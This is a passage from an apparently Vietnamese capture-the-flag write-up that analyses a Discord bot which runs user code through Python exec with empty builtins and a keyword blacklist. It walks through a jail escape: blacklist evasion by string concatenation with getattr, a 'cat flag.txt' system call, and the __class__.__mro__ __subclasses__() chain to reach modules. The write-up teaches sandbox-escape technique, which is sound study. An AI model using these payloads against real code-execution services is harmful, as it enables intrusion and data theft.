<span class="k">exec</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">hack</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">hack</span><span class="p">[</span><span class="s">"func"</span><span class="p">]())</span>
</pre></table></code></div></div><p>Chú ý vào hàm <a href="https://www.programiz.com/python-programming/methods/built-in/exec">exec</a>. Syntax của nó là: <code class="language-plaintext highlighter-rouge">exec(object, dictionary)</code>.Đây là một hàm cho phép chúng ta thực thi một chương trình con được tạo ra bên trong chương trình lớn, ở đây nó được mô tả bằng string như sau: <code class="language-plaintext highlighter-rouge">f"def func():\n{textwrap.indent(sys.stdin.read(), ' ')}"</code> Đây là một <a href="https://www.datacamp.com/community/tutorials/f-string-formatting-in-python?utm_source=adwords_ppc&amp;utm_campaignid=1455363063&amp;utm_adgroupid=65083631748&amp;utm_device=c&amp;utm_keyword=&amp;utm_matchtype=b&amp;utm_network=g&amp;utm_adpostion=&amp;utm_creative=332602034358&amp;utm_targetid=aud-392016246653:dsa-429603003980&amp;utm_loc_interest_ms=&amp;utm_loc_physical_ms=9074107&amp;gclid=Cj0KCQjw28T8BRDbARIsAEOMBcw7Z_dWa_YH5ZnUE0vDBnxzY7f3SbpwcmuYFwvzqwPKAJXu_bKxdqMaApJbEALw_wcB">f-string</a>. Nó cũng tương tự như các string bình thường trừ việc chúng ta có thể truyền vào f-string expression bên trong cặp dấu {}. Khi chúng ta truyền vào một string bình thường chứa code thì hàm exec sẽ kiểm tra xem liệu các phương thức được call trong string có xuất hiện trong dictionary hay không. Ở đây dictionary chính là <code class="language-plaintext highlighter-rouge">hack = {"__builtins__": {}}</code>, trong đó builtins là một module nền tảng, chứa tất cả các hàm thông dụng nhất của Python như print, input, và các hàm được phép define trong dictionary này chỉ giới hạn trong module builtins. Làm 1 ví dụ so sánh thế này cho dễ hiểu:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97032928-bfa81300-158c-11eb-956f-40032dc8441d.png" alt="image" /></p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97033988-66d97a00-158e-11eb-8935-619efd48faea.png" alt="image" /></p><p>Tuy nhiên, ngay cả khi trong dictionary builtins đã được gọi ra thì khi ta inject <code class="language-plaintext highlighter-rouge">print('hello world')</code> như hình trước đó thì vẫn trả về <code class="language-plaintext highlighter-rouge">'print' is not defined</code> mặc dù print là một hàm nằm trong module builtins. Lý do là vì trong dictionary tác giả không define bất kì hàm nào, hay nói đúng hơn là cái dictionary này trống không nên dùng bất kì hàm nào nó cũng báo lỗi hết! Well, thế nghe có vẻ không hợp lý cho lắm, nội dung của chương trình con chứa trong biến “module” có phần định nghĩa hàm: <code class="language-plaintext highlighter-rouge">def func():</code>, chả lẽ định nghĩa hàm func này xong chúng ta lại vứt nó ở đấy không viết gì thêm cho phần thân hàm nữa chỉ vì các hàm predefined đều không sử dụng được!!!??? Thật may vì đây là f-string:v Vì những gì bên trong cặp dấu {} của f-string sẽ được hàm exec bypass và sẽ được compiler xử lý như phần code nằm phía bên ngoài của string, chúng ta có thể tha hồ viết như thế này:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>f"def func():\n{textwrap.indent(sys.stdin.read(), '    ')}" mà không cần quan tâm hàm indent hay read kia có nằm trong module builtins hay dictionary chúng ta đã tạo ra hay không (tất nhiên chúng ta phải import textwrap và import sys mới xài 2 hàm kia được). Trước tiên chúng ta xét hàm [indent](https://docs.python.org/3/library/textwrap.html).  Ở đây parameter "text" của hàm là một stdin, nói dơn giản thì đó là dữ liệu mà user nhập vào sẽ được hàm xử lý ngay tại chỗ, parameter còn lại - prefix ở đây là `'        '` . Đi sâu hơn về stdin, ở tác giả sử dụng hàm read ([sys.stdin.read](https://www.geeksforgeeks.org/difference-between-input-and-sys-stdin-readline/)) để lọc dữ liệu đầu vào dựa theo parameter size. Demo thế này cho dễ hiểu:
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97067444-70430080-15e7-11eb-9d0b-d82ed4bdfa94.png" alt="image" /></p><p>Giả dụ nếu tôi không truyền vào parameter size, tức là xóa số 4 trên hình kia đi cho nó giống với source code của tác giả, nó sẽ như nào nhỉ:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97067584-e4ca6f00-15e8-11eb-84bc-42c180af2393.png" alt="image" /></p><p>Wait what!? Lúc nãy tôi nhập vào 1 lần ((nhập linh tinh gì cũng được) là nó cho ra ngay output là “haha” rồi kết thúc chương trình luôn. Còn bây giờ thì nó cứ bắt tôi nhập mãi không chịu dừng là thế nào??? (well, tôi phải Ctrl + C thì để dừng nó lại nên mới có cái traceback kia). Chúng ta có thể inject payload vào con bot được chính là nhờ có hàm này, chạy source code trên terminal nó ra như thế nào thì trên discord nó cũng phải giống y như vậy. Vậy tại sao nó lại méo giống thế nhỉ:v</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97067882-ae8eee80-15ec-11eb-8e21-a0084e140434.png" alt="image" /></p><p>Ở trong discord thì chỉ cần nhập 1 lần thì chương trình đã dừng rồi. Vậy chắc phải có gì đó ở bên source code “bot.py” tác động vào thì nó mới ra được output trên discord khác so với terminal như thế này nhỉ. Bingo! Đúng là vậy thật:»</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">action</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">create_subprocess_exec</span><span class="p">(</span><span class="s">"py"</span><span class="p">,</span> <span class="s">"exploit.py"</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
</pre></table></code></div></div><p>Phân tích code một chút nào. Cú pháp <a href="https://docs.python.org/3/library/asyncio.html">asyncio</a> cho chúng ta biết đây là một <a href="https://docs.python.org/3/glossary.html#term-coroutine">coroutine</a>. Từ class asyncio gọi method <a href="https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.create_subprocess_exec">create_subprocess_exec</a> nhằm tạo ra một subprocess. Method này nhận có parameter “program” là “py” và parameter object chính là file source code “exploit.py”. Điều này có nghĩa là coroutine hiện tại đang chạy command “py” (lệnh của cmd dùng để gọi trình biên dịch Python) để translate các kí tự từ input stream của nó là file exploit.py thành một chương trình con. Các tham số về <a href="https://en.wikipedia.org/wiki/Standard_streams">standard stream</a> dùng để đều được set là <code class="language-plaintext highlighter-rouge">asyncio.subprocess.PIPE</code>. Đây là một giá trị đặc biệt thường dùng để gán cho <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_input_%28stdin%29">stdin</a>, <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_output_%28stdout%29">stdout</a> và <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_error_%28stderr%29">stderr</a>, thể hiện rằng một <a href="https://whatis.techtarget.com/definition/pipe#:~:text=In%20computer%20programming,%20especially%20in,is%20one-way%20communication%20only.&amp;text=A%20pipe%20is%20fixed%20in,usually%20at%20least%204,096%20bytes.">pipe</a> kết nối từ subprocess được tạo ra (ở đây là process “action”) đến standard stream cần phải được mở ra. Điều này ảnh hưởng trực tiếp tới việc process “action” gọi method <a href="https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.asyncio.subprocess.Process.communicate">communicate</a> ở khối code “try” ở ngay sau đó:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">try</span><span class="p">:</span>
    <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">wait_for</span><span class="p">(</span><span class="n">action</span><span class="p">.</span><span class="n">communicate</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">()),</span> <span class="mi">5</span><span class="p">)</span>
<span class="k">except</span> <span class="n">asyncio</span><span class="p">.</span><span class="nb">TimeoutError</span><span class="p">:</span>
    <span class="k">await</span> <span class="n">action</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">out</span> <span class="ow">or</span> <span class="n">err</span><span class="p">:</span>
       <span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"```py</span><span class="se">\n</span><span class="si">{</span><span class="n">out</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}{</span><span class="n">err</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s">```"</span><span class="p">)</span>
</pre></table></code></div></div><p>Vì <code class="language-plaintext highlighter-rouge">stdin=asyncio.subprocess.PIPE</code> nên method communicate sẽ gửi data tới process “action” thông qua stdin (hình dung nó như 1 cái cổng để data (đã được encode thông qua <code class="language-plaintext highlighter-rouge">data.encode()</code>) có thể truyền vào 1 process), tất nhiên là với điều kiện tham số input (ở đây là <code class="language-plaintext highlighter-rouge">data.encode()</code>) của method communicate phải khác “None”. Tương tự, vì <code class="language-plaintext highlighter-rouge">stdout=asyncio.subprocess.PIPE</code> và <code class="language-plaintext highlighter-rouge">stderr=asyncio.subprocess.PIPE)</code> nên method communicate sẽ trả về một result tuple (stdout_data, stderr_data) như mong muốn thay vì trả về kết quả mặc định là “None” (hình dung stdout và stderr như 2 cái cổng ra của output tạo ra bởi process, nếu có thể trả về được output thì nó sẽ đi ra cổng stdout, nếu bị lỗi thì sẽ qua cổng stderr). <code class="language-plaintext highlighter-rouge">action.communicate(data.encode())</code> là một <a href="https://docs.python.org/3/library/asyncio-task.html#awaitables">awaitable</a> object (hay đúng hơn là một coroutine), do đó có thể truyền nó vào method <a href="https://docs.python.org/3/library/asyncio-task.html#timeouts">asyncio.wait_for</a>. Đoạn <code class="language-plaintext highlighter-rouge">asyncio.wait_for(action.communicate(data.encode()), 5)</code> này có thể hiện rằng method wait_for này sẽ chờ coroutine <code class="language-plaintext highlighter-rouge">action.communicate(data.encode())</code> trong khoảng thời gian 5 giây. Nếu xảy ra tình trạng timeout (<code class="language-plaintext highlighter-rouge">asyncio.TimeoutError</code>) thì ngay lập tức <a href="https://docs.python.org/3/library/subprocess.html#subprocess.Popen.kill">kill</a> process “action” (<code class="language-plaintext highlighter-rouge">await action.kill()</code>), không thì output hoặc err sinh ra sẽ được gửi đến và hiển thị trên discord. Từ những phân tích ở trên chúng ta có thể <strong>tóm tắt</strong> quá trình hoạt động của <a href="https://www.aeracode.org/2018/02/19/python-async-simplified/#:~:text=When%20you%20have%20an%20asynchronous,changes%20how%20its%20call%20behaves.&amp;text=The%20code%20in%20the%20target,event%20loop%20to%20do%20that.">asynchronous function </a> “flag” như sau:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">)</span>
<span class="k">async</span>  <span class="k">def</span>  <span class="nf">flag</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
   <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">):</span>
       <span class="n">data</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
   <span class="k">else</span><span class="p">:</span>
       <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"` </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
   <span class="k">for</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
       <span class="k">if</span> <span class="n">ban</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
          <span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'Invalid Payload xD'</span><span class="p">)</span>
          <span class="k">return</span>
   <span class="n">action</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">create_subprocess_exec</span><span class="p">(</span><span class="s">"py"</span><span class="p">,</span> <span class="s">"exploit.py"</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
   <span class="k">try</span><span class="p">:</span>
        <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">wait_for</span><span class="p">(</span><span class="n">action</span><span class="p">.</span><span class="n">communicate</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">()),</span> <span class="mi">5</span><span class="p">)</span>
   <span class="k">except</span> <span class="n">asyncio</span><span class="p">.</span><span class="nb">TimeoutError</span><span class="p">:</span>
        <span class="k">await</span> <span class="n">action</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
   <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">out</span> <span class="ow">or</span> <span class="n">err</span><span class="p">:</span>
           <span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"```py</span><span class="se">\n</span><span class="si">{</span><span class="n">out</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}{</span><span class="n">err</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s">```"</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>Bước 1: Khối lệnh if…else đầu tiên, đây là lúc chương trình xử lý tham số “data” được truyền vào của hàm flag (đồng thời cũng là dữ liệu do người dùng nhập vào từ discord, hay chính là payload). Nếu <code class="language-plaintext highlighter-rouge">data.startswith("</code><code class="language-plaintext highlighter-rouge">") and data.endswith("</code><code class="language-plaintext highlighter-rouge">")</code> thì thực hiện <a href="https://www.w3schools.com/python/ref_string_split.asp">split</a> string “data” thành một mảng string con theo kí tự “\n” (Enter), đồng thời chỉ lấy các phần tử trong mảng mới tạo ra từ index số 1 đến index cuối cùng (bỏ phần tử đầu tiên có index 0): <code class="language-plaintext highlighter-rouge">data.split("\n")[1:-1]</code> để đem đi <a href="https://www.w3schools.com/python/ref_string_join.asp">join</a> lại với kí tự “\n”. Hình minh họa dưới đây sẽ giúp bạn hiểu rõ hơn:</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97134166-f776ac80-177e-11eb-8591-463873ddf403.png" alt="image" /></p><p>Nếu không như vậy thì thực hiện <a href="https://www.w3schools.com/python/ref_string_strip.asp">strip</a> data theo 3 kí tự là “`”, “ “ và “\n” :</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97134786-f5ade880-1780-11eb-9944-bb3809f8ed16.png" alt="image" /></p><ul><li>Bước 2: Tiếp theo là khối lệnh <code class="language-plaintext highlighter-rouge">for ban in banned:</code>, cái này thì tôi đã giải thích ở trên rồi, các bạn kéo lên mà đọc nhé:v<li>Bước 3: Sau đó là câu lệnh tạo một subprocess để chạy trong chính chương trình hiện tại tên là “action”, và subprocess sẽ thực thi file exploit.py. Đoạn này tôi cũng đã giải thích rất kỹ rồi, các bạn lại kéo lên đọc tiếp nhé:v<li>Bước 4: Cuối cùng và cũng là quan trọng nhất, subprocess “action” sau khi được tạo ra sẽ nhận vào đã data (string) vừa được cắt gọt, xử lý ở bước 1 để truyền vào chính nó. Process “action” thực thi file exploit.py, theo cơ chế <a href="https://vi.wikipedia.org/wiki/Pipeline_(Unix)">pipeline</a>, data (lúc này đã được encode) sẽ đóng vai trò là input của process “exploit” (hay còn gọi là “action”). Nói một cách đơn giản, thay vì phải ngồi input dữ liệu bằng tay cho “exploit” như thế này:</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97160294-b5655f00-17ae-11eb-9e27-c00fc5782bbc.png" alt="image" /></p><p>vừa mỏi tay vừa bị lỗi chương trình bắt người dùng nhập vô hạn (tôi đã có đề cập ở phía trên những tới bây giờ mới giải thích đc:v), process cha (thực thi file bot.py) đã nhập hộ vào process con là “exploit” thay chúng ta rồi, và cái mà process “bot” nhập chính là biến data (đã được encode). Do đó khi truyền payload vào discord không xảy ra tình trạng chương trình bắt nhập dữ liệu liên tục không dừng như mình demo ở trên nữa, vì stdin của process “exploit” đã xác định được size của dữ liệu nhập vào nên khi gọi method <code class="language-plaintext highlighter-rouge">sys.stdin.read()</code> nó sẽ biết điểm dừng ở đâu mặc dù không truyền tham số size vào:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97161651-b3040480-17b0-11eb-8ac3-8445af6763d4.png" alt="image" /></p><ul><li>Bước 5: Cuối cùng, sau quá trình liên kết giữa process cha và process con, method sẽ sinh ra turple out và err (có nói phía trên rồi thắc mắc thì đọc lại nha:3).</ul><p>2/ Exploiting (Python Jail Escape, OOP in Python):</p><p>Sau khi initial reconnaissance, chúng ta đã biết được con đường vận chuyển payload của user sau khi được nhập trên discord như thế nào. Thay vì nhập những payload vô nghĩa để test thử chương trình hoạt động như nào, bây giờ chúng ta sẽ tập trung vào những cái có nghĩa hơn cho việc khai thác con bot. Như những gì tôi đã phân tích về source code “exploit,py”, dictionary “hack” mặc dù đã khai báo rằng mình sẽ sử dụng các method trong module builtins nhưng module builtins said: “Không, tao đếch có cái method gì để cho mày cả thằng “hack” ạ!”: <code class="language-plaintext highlighter-rouge">hack = {"__builtins__": {}}</code>. Điều này đồng nghĩa với việc nếu chúng ta có các hàm của module này như <code class="language-plaintext highlighter-rouge">print</code>, <code class="language-plaintext highlighter-rouge">file</code>, <code class="language-plaintext highlighter-rouge">open</code> thì sẽ xuất ra err: “something” is not defined (có đề cập ở phần đầu của initial reconnaissance). Các method vốn không nằm trong builtins có thể dùng được như <code class="language-plaintext highlighter-rouge">eval</code> hay <code class="language-plaintext highlighter-rouge">immport</code> cũng bị tác giả cho vào blacklist gần hết:(( Nhưng chúng ta hoàn toàn có thể thay thế các method kia bằng lệnh <code class="language-plaintext highlighter-rouge">return</code>, đơn giản vì return là một <strong>keyword</strong> của python chứ không phải là predefined method như bọn kia, không phải “ăn nhờ ở đậu” ở bất cứ module nào. Test thử xem nào:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97167759-f0b95b00-17b9-11eb-9fd4-207fc8e3a980.png" alt="image" /></p><p>GREATTT!!! Đây cũng chính là điều mà hint số 2 muốn nói. Tại sao nó có thể in ra số 1 như thể chúng ta đang nhập <code class="language-plaintext highlighter-rouge">print(1)</code> thế kia. Nhìn lại source code exploit.py một chút là biết:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">module</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"def func():</span><span class="se">\n</span><span class="s">  </span><span class="si">{</span><span class="n">textwrap</span><span class="p">.</span><span class="n">indent</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="s">' '</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
<span class="k">exec</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">hack</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">hack</span><span class="p">[</span><span class="s">"func"</span><span class="p">]())</span>
</pre></table></code></div></div><p>Sau khi inject payload <code class="language-plaintext highlighter-rouge">return 1</code> vào, theo dòng pipeline và quá trình xử lý payload của stdin <code class="language-plaintext highlighter-rouge">{textwrap.indent(sys.stdin.read(), ' ')}</code>, chúng ta sẽ có biến module (chứa executable code) ban đầu trở thành như thế này:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">module</span> <span class="o">=</span> <span class="s">"def func():</span><span class="se">\n</span><span class="s"> return 1"</span>
</pre></table></code></div></div><p>Tiếp theo sau khi <code class="language-plaintext highlighter-rouge">exec(module, hack)</code>, hàm func được define trong biến module sẽ được nạp vào như một phần tử trong dictionary hack (bên cạnh cái builtins trống không). Cuối cùng chúng ta có thể in ra số 1 là nhờ <code class="language-plaintext highlighter-rouge">print(hack["func"]())</code> ra giá trị trả về của hàm func là 1. Như vậy, chúng ta đã giải quyết được vấn đề: “Làm thế nào để bắt con bot display cái gì đó ra theo ý mình?”. Đừng quên thứ mà chúng ta muốn display ở đây là flag, nhưng mà nó có thể ở đâu được nhỉ? Con bot này được kết nối với server của cuộc thi, trên server đó rất có thể chứa các file có khả năng có flag trong đấy kiểu như “flag.txt” chẳng hạn:v Vậy sao chúng ta không “cat flag.txt” (như kiểu trong terminal của Linux ý, server nó cũng chỉ như 1 cái PC chứa file trong đấy thôi mà:v) để đọc được nội dung bên trong nó là gì (thật may trong blacklist, banned của tác giả không có từ “cat”&lt;3). Để có thể thực hiện được command này trong một chương trình Python thì phải có dùng method <a href="https://www.geeksforgeeks.org/python-os-system-method/">system</a>, mà muốn có method này thì chúng ta phải load được module os. Nên nhớ cả “os” và “system” nó cũng nằm trong blacklist:v Để tránh bị con bot reponse lại là “Invalid Payload xD” chỉ có duy nhất một cách là <a href="https://www.w3schools.com/python/gloss_python_string_concatenation.asp">string concatenation </a>, ví dụ: thay vì phải inject vào payload là ‘os’, ta dùng: ‘o’+’s’. Tôi bỗng nhớ ra một method trong module “builtins” có thể có ích để giải quyết được vấn đề này, đó là <a href="https://www.w3schools.com/python/ref_func_getattr.asp">getattr()</a>. Thay vì gọi và truyền tham số cho method system theo kiểu “os.system(“cat flag.txt”)” như bình thường, chúng ta có thể gọi nó lại như sau để escape Python jail được của tác giả:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>getattr(os,'sys'+'tem')("cat flag.txt") Như vậy, chúng ta đã vượt qua được 1 "jail", "jail" tiếp theo cần phải vượt qua đó là "os" cũng như "builtins". Cái khó nhất là ở đây, các keyword như "import" hay ["__import__" ](https://www.geeksforgeeks.org/how-to-dynamically-load-modules-or-classes-in-python/) đã bị cấm mất rồi, do đó chúng ta không thể import module theo cách thông thường được. Đây là lúc chúng ta áp dụng kiến thức về [SSTI](https://www.hacktoday.io/t/flask-jinja2-ssti-cheatsheet/2259) để escap Python Jail. Về cơ bản tôi có thể dễ dàng access một vào rất nhiều class (ở đây chính là các module) bằng cách kiểu như sau:

().__class__.__mro__[&lt;a number&gt;].__subclasses__() Cùng phân tích cú pháp một chút nào. Dấu "()" kia biểu diễn một object trong Python, ở đây object "()" thuộc kiểu [tuple](https://toidicode.com/tuple-trong-python-347.html), nhưng đây lại là một tuple trống. Tôi hoàn toàn có thể thêm bao nhiêu phần tử vào trong cái tuple trống này cũng được mà không gặp vấn đề gì, kiểu như thế này:

(1,2).__class__.__mro__[1].__subclasses__()
</pre></table></code></div></div><p>Hoặc thậm chí là vứt thằng tuple này đi để sử dụng object “string”, nó cũng chả khác một tí gì:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>'hehe'.__class__.__mro__[1].__subclasses__() Có một định luật khá thú vị trong Python:"Vạn vật đều là Object". Từ những cái nhìn tưởng như là những value vô hại để gán vào cho một biến chứa kiểu dữ liệu nào đó như string('hehe'), tuple((1,2),()),..v.v thực chất tất cả chúng đều là một object thực thụ. Mà một object thì đương nhiên có thể gọi được method. Nhưng trước khi gọi được method, chúng ta phải tham chiếu tới kiểu dữ liệu của object hiện tại (xem giải thích tại [đây](https://stackoverflow.com/questions/20599375/what-is-the-purpose-of-checking-self-class-python#:~:text=__class__%20is%20a,type%20of%20the%20current%20instance.&amp;text=Throwing%20an%20exception%20here%20is,you%20from%20making%20silly%20mistakes.&amp;text=type%28%29%20should%20be%20preferred,shadowed%20by%20a%20class%20attribute.)):

&lt;object&gt;.__class__  Minh họa một chút về syntax cho dễ hiểu:
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97830700-754b3280-1d00-11eb-8197-ae33964fde92.png" alt="image" /></p><p>Object hiện tại thuộc kiểu dữ liệu “tuple”, tuy nhiên nó vẫn chưa phản ánh hết đầy đủ bản chất của object “()”, vì có thể object này có thể đang thừa kế từ rất nhiều class khác nữa, muốn biết điều này liệu có đúng hay không chúng ta phải kiểm tra xem <a href="https://www.researchgate.net/figure/A-Class-inheritance-tree_fig1_49595557">“cây thừa kế”</a> có những gì. Tôi có thể dễ dàng làm được điều này bằng cách gọi thuộc tính <a href="https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#class.__mro__">mro</a> của object hiện tại:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;object&gt;.__class_.__mro__ Demo một chút nào:
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97832269-f1477980-1d04-11eb-9d01-5e69b72937cc.png" alt="image" /></p><p>Như vậy, output của <code class="language-plaintext highlighter-rouge">().__class__.__mro__</code> là một tuple bao gồm 2 phần tử là , <code class="language-plaintext highlighter-rouge">&lt;class 'tuple'&gt;</code> và <code class="language-plaintext highlighter-rouge">&lt;class 'object'&gt;</code>, trong đó phần tử thứ 2 của tuple chính là class “thủy tổ” trong ngôn ngữ Python, mọi class cho dù là predefined hay user-defined đều ngầm định là class thừa kế, là con của <code class="language-plaintext highlighter-rouge">class 'object'</code>. Từ class “thủy tổ” này chúng ta có thể truy cập đến một list rất rộng các class con của nó, trong đó chắc chắn bao gồm class có sẵn (predefined) trong Python, và bên trong các “predefined class” này lại chắc chắn chứa một module hay package chứa module (bản thân module cũng chính là class) nào đó có các method hữu dụng để load các module khác lên giống như kiểu câu lệnh “import” (bản thân “import” cũng là predefined:v), bằng cách sử dụng method <a href="https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#class.__subclasses__">subclass</a> (từ đoạn này chúng ta chỉ quan tâm đến danh sách các class con của class “object” thôi):</p><div class="language-plaintext 